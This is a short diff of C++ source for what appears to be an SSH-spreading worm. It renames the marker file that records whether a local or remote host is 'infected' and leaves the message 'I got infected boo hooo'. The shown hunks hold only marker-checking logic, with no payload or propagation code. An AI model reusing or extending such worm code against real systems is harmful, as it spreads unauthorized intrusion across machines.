@@ -99,7 +99,7 @@ bool isRemoteFileExist(ssh_session &sshClient, const string inFile) {
  * @return a boolean of true if infected or marked as master or false if not
  ******************************************************************************/
 bool isLocalSystemInfected() {
-    return ( isFileExist(SELF_MARKER_FILE) || isFileExist(INFECTED_MARKER_FILE));
+    return ( isFileExist(SELF_MARKER_FILE) || isFileExist(REPLICATOR_MARKER_FILE));
 }
 
 /*******************************************************************************
@@ -109,7 +109,7 @@ bool isLocalSystemInfected() {
  ******************************************************************************/
 bool isRemoteSystemInfected(ssh_session &sshClient) {
     return (isRemoteFileExist(sshClient, SELF_MARKER_FILE) ||
-            isRemoteFileExist(sshClient, INFECTED_MARKER_FILE));
+            isRemoteFileExist(sshClient, REPLICATOR_MARKER_FILE));
 }
 
 /*******************************************************************************
@@ -150,7 +150,7 @@ void markSystemAsInfected(const string fromHost = "") {
         msg += "I got infected boo hooo";
     }
     // Mark the system
-    markSystem(INFECTED_MARKER_FILE, msg);
+    markSystem(REPLICATOR_MARKER_FILE, msg);
 
 }
 
